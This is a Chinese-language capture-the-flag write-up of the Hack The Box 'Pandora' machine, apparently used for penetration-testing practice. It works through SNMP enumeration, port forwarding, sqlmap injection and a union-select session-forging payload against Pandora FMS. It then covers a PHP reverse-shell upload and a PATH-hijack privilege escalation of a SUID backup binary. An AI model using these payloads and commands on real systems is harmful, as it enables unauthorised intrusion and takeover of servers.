HTB Pandora Writeup
2022-01-23 16:45:18


为了试一下nessus的功能做的这一题

目标扫描


扫描到了一个SNMP public
打开msfconsole,使用auxiliary/scanner/snmp/snmp_enum对目标enum

找到了daniel帐号和密码，查看了一下user flag在matt帐号里。所以要获得matt帐号

matt权限

看到上图程序host_check引用了danie帐号，来看看这个程序

有2个关键的信息"check PandoraFMS registered hosts" curl 'http://127.0.0.1/pandora_console/include/api.php?op=get&op2=all_agents&return_type=csv&other_mode=url_encode_separator_%7C&user=daniel&pass=HotelBabylon23' > ~/.host_check 2>/dev/nullHost
现在我们去看看这个地址,用ssh转发80端口，还可以用chisel工具来穿透，这里我们选中ssh方便一些

ssh -L 82:127.0.0.1:80 daniel@10.10.11.136


然后在浏览器里访问127.0.0.1

搜索图片底下的版本号可以搜出来Pandora FMS 742这篇文章
上面详细介绍了

这3个漏洞，但没有给出poc。（github里有poc搜这个CVE号就可以）
可以看看这个文章的介绍
漏洞的话就是$_REQUEST['session_id']没有过滤用户输入配合session_decode($info['data']);修改$_SESSION['id_usuario']的值。

如何利用

根据这篇报道我们知道/pandora_console/include/chart_generator.php存在漏洞我们用sqlmap测试一下

sqlmap -u "http://127.0.0.1:82/pandora_console/include/chart_generator.php?session_id=1" --dbs #爆出数据库pandora
sqlmap -u "http://127.0.0.1:82/pandora_console/include/chart_generator.php?session_id=1" --batch --dbms=mysql -D pandora  -T  tsessions_php --columns  --level 5 --risk 3 #爆出了3个字段，到这里就可以了。表tsessions_php在文章里提到了



现在就可以构造poc了
' union select 'id_usuario|s:5:"admin";','id_usuario|s:5:"admin";','id_usuario|s:5:"admin";' -- ojj41

http://127.0.0.1:82/pandora_console/

回到这个界面

在这里可以上传文件，在我玩这个机器的时候上面已经有一个别人上传的shell.php文件了所以我直接用的他的。

你们也可以在网上搜索一个php反shell文件。改一下ip和端口就可以了

根据图标的图片地址可以推断出我们上传地址
127.0.0.1:82/pandora_console/images/

反弹成功

root权限

反弹成功后就找一下有s权限的程序，看到一个叫pandora_backup


可以看到改程序运用了tar.提权思路就是创建一个tar程序写入/bin/bash然后添加到path里

cd /tmp
echo "/bin/bash" > tar
chmod +x tar
export PATH=/tmp:$PATH



没有提权成功
用ssh来试一下

ssh-keygen
cp id_rsa.pub authorized_keys
chmod 700 authorized_keys
#复制id_rsa的内容


然后返回到宿主机

#新建文件id_rsa,把内容复制进去
chmod 600 id_rsa
ssh -i id_rsa matt@10.10.14.16



进去后重复老步骤就可以提权。
